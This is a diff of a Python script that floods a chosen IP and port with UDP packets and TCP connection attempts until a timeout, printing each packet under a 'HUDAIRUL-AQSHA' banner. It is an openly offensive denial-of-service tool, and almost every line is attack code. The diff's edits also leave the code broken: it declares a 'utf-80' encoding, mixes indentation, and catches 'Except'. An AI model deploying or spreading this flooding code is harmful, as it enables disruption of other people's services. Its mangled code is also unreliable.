@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+#_*_ coding: utf-80 _*_
 import os
 import threading
 import sys
@@ -38,27 +39,27 @@ timeout = time.time() + t1m3
 sent = 0
 data = 'f1a525da11f6'.decode('hex')
 while True:
-        try:
-                if time.time() > timeout:
-                        break
-                else:
-                        pass
-                udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-                syn = socket.socket()
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-                if port == "0":
+        try: 
+	   if time.time() > timeout:
+                 break
+           else:
+                 pass
+               udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+               syn = socket.socket()
+               s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
+               if port == "0":
                         port = random.randrange(1, 65535)
-                s.connect((ip, port))
-                s.send(data)
-                bytes = random._urandom(size)
-                syn.connect((ip, port))
-                udp.sendto(bytes,(ip, port))
-                sent = sent + 1
-                print("\033[32mHUDAIRUL-AQSHA:  \033[96mTarget --> %s | Port: %s | And size: %s | TiMe: %s | Pack: %s\033[0m")%(ip, port, size, t1m3, sent)
+               s.connect((ip, port))
+               s.send(data)
+               bytes = random._urandom(size)
+               syn.connect((ip, port))
+               udp.sendto(bytes,(ip, port))
+               sent = sent + 1
+               print("\033[32mHUDAIRUL-AQSHA:  \033[96mTarget --> %s | Port: %s | And size: %s | TiMe: %s | Pack: %s\033[0m")%(ip, port, size, t1m3, sent)
 				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
         except KeyboardInterrupt:
-                print(" Stopping Flood!")
-                sys.exit()
+               print(" Stopping Flood!")
+               sys.exit()
         except Except as e:
-                print("Socket Couldn't Connect")
-                sys.exit()
+               print("Socket Couldn't Connect")
+               sys.exit()
